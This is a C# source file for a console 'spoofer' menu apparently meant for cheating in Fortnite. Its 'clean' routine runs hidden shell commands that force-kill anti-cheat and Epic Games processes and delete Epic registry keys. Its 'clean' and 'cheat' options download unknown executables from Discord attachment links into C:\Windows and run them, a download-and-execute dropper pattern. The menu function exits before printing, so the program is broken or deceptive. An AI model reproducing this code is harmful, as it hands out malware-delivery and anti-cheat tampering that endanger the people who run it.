using System;
using System.Diagnostics;
using System.Net;
using System.Security.Principal;
using System.Threading;

namespace Spoofer_menu_test;

internal class Print
{
	private static string SIDCleaner = WindowsIdentity.GetCurrent().User!.Value;

	public static void Cleantraces()
	{
		Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
		process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
		process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
		process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
		process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
		process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
		process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
		process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
		process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
		process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
		process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
		process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + SIDCleaner + "\\Software\\Epic Games\" /f");
		process.StandardInput.WriteLine("exit");
	}

	public static void CloseProcesses()
	{
		Process[] processesByName = Process.GetProcessesByName("4u4playSPOOFERv6.exe");
		foreach (Process obj in processesByName)
		{
			obj.CloseMainWindow();
			obj.WaitForExit();
		}
	}

	public static void Cleantraces3()
	{
		using Process process = new Process();
		WebClient webClient = new WebClient();
		string address = "https://cdn.discordapp.com/attachments/682256646776684561/693119273346007130/Cakce_1.exe";
		string fileName = "C:\\Windows\\Cakce_1.exe";
		webClient.DownloadFile(address, fileName);
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = fileName;
		process.Start();
		Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
		process.WaitForExit();
	}

	public static void CleanTraces2()
	{
		using Process process = new Process();
		WebClient webClient = new WebClient();
		string address = "https://cdn.discordapp.com/attachments/670374247335591944/670404644807114752/Caught.Power.exe";
		string fileName = "C:\\Windows\\Caught.Power.exe";
		webClient.DownloadFile(address, fileName);
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = fileName;
		process.Start();
		Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
		process.WaitForExit();
	}

	public static void Clean()
	{
		Thread.Sleep(1000);
		Console.Clear();
		Console.WriteLine("cleaning...");
		Thread.Sleep(1000);
		Cleantraces3();
		CleanTraces2();
		Cleantraces();
		Thread.Sleep(5000);
		Console.Clear();
		prints();
	}

	public static void Cheat()
	{
		using Process process = new Process();
		Console.Clear();
		WebClient webClient = new WebClient();
		string address = "https://cdn.discordapp.com/attachments/682256646776684561/692694753627602964/Acrack.exe";
		string fileName = "C:\\Windows\\Acrack.exe";
		webClient.DownloadFile(address, fileName);
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = fileName;
		process.Start();
		Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
		process.WaitForExit();
		Console.Clear();
		prints();
	}

	public static void prints()
	{
		Thread.Sleep(1000);
		Console.Title = "985012687091269047683487216781936136126 | IF YOU BOUGHT IT YOU HAVE BEEN SCAMMED";
		Thread.Sleep(1000);
		Console.Clear();
		Environment.Exit(1);
		Console.WriteLine("pigmen.club spoofer by 666debilek280#2038 / free pepega / if you bought it you have been scammed / 1.0.1");
		Console.WriteLine("spoofer undetected on: easyanticheat");
		Console.WriteLine("subscription: free");
		Console.WriteLine("");
		Console.ResetColor();
		Console.WriteLine("[1] spoof");
		Console.WriteLine("");
		Console.WriteLine("[2] clean");
		Console.WriteLine("");
		Console.WriteLine("[3] fortnite cheat");
		Console.WriteLine("");
		Console.Write("option: ");
	}
}
